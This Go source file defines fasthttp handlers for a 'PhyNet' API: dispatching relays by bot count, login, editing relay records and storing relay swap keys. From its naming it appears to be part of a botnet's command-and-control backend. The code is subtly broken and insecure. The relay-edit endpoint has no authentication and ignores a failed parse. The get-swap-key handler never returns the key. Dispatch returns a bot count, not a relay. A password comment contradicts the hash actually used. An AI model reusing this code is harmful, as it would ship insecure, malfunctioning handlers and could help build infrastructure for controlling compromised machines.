package handlers

import (
	"crypto/sha512"
	"encoding/hex"
	"strconv"

	dbs "github.com/4lxprime/PhyNet/PhyNet/server/api/v3/internal/databases"
	"github.com/valyala/fasthttp"
)

// ["/v3/dispatch"]
func HandleDispatch(ctx *fasthttp.RequestCtx) {
	conn := dbs.GetPostgres()

	var relay string
	if err := conn.QueryRow(
		`SELECT MIN(relay_bots) FROM relays`,
	).Scan(&relay); err != nil {
		ctx.SetStatusCode(500)
		return
	}

	ctx.SetBodyString(relay)
	ctx.SetStatusCode(200)
}

// ["/v3/login"] ?username &password
func HandleLogin(ctx *fasthttp.RequestCtx) {
	username := ctx.QueryArgs().Peek("username")
	password := ctx.QueryArgs().Peek("password") // sha256 hashed password

	conn := dbs.GetPostgres()

	passwordHashBytes := sha512.Sum512(password)
	passwordHash := hex.EncodeToString(passwordHashBytes[:])

	var exists bool
	if err := conn.QueryRow(
		`SELECT EXISTS(SELECT 1 FROM users WHERE username=$1 AND password=$2)`,
		string(username),
		passwordHash,
	).Scan(&exists); err != nil {
		ctx.SetStatusCode(500)
		return
	}

	if !exists {
		ctx.SetStatusCode(401)
		return
	}

	ctx.SetStatusCode(200)
}

// ["/v3/relays_edit"] ?action &ip &bots
func HandleRelaysEdit(ctx *fasthttp.RequestCtx) {
	action := ctx.QueryArgs().Peek("action")
	relayIp := ctx.QueryArgs().Peek("ip")
	relayBots := ctx.QueryArgs().Peek("bots")

	rIp := string(relayIp)

	bots, err := strconv.Atoi(string(relayBots))
	if err != nil {
		ctx.SetStatusCode(500)
	}

	conn := dbs.GetPostgres()

	switch string(action) {
	case "delete":
		if _, err := conn.Exec(
			`DELETE FROM relays WHERE relay_ip=$1`,
			rIp,
		); err != nil {
			ctx.SetStatusCode(500)
			return
		}

	case "update":
		if _, err := conn.Exec(
			`UPDATE relays SET relay_bots=$1 WHERE relay_ip=$2`,
			bots,
			rIp,
		); err != nil {
			ctx.SetStatusCode(500)
			return
		}

	case "insert":
		if _, err := conn.Exec(
			`INSERT INTO relays (relay_ip, relay_bots, relay_swap_key) VALUES ($1, $2, $3)`,
			rIp,
			bots,
			"",
		); err != nil {
			ctx.SetStatusCode(500)
			return
		}
	}

	ctx.SetStatusCode(200)
}

// ["/v3/swap_key"] ?key
func HandleSwapKey(ctx *fasthttp.RequestCtx) {
	swapKey := ctx.QueryArgs().Peek("key")

	rIp := ctx.RemoteIP().String()

	conn := dbs.GetPostgres()

	if _, err := conn.Exec(
		`UPDATE relays SET relay_swap_key=$1 WHERE relay_ip=$2`,
		string(swapKey),
		rIp,
	); err != nil {
		ctx.SetStatusCode(500)
		return
	}

	ctx.SetStatusCode(200)
}

// ["/v3/get_swap_key"] ?relay_ip
func HandleGetSwapKey(ctx *fasthttp.RequestCtx) {
	relayIp := ctx.QueryArgs().Peek("relay_ip")

	rIp := string(relayIp)

	conn := dbs.GetPostgres()

	if _, err := conn.Exec(
		`SELECT relay_swap_key FROM relays WHERE relay_ip=$1`,
		rIp,
	); err != nil {
		ctx.SetStatusCode(500)
		return
	}

	ctx.SetStatusCode(200)
}
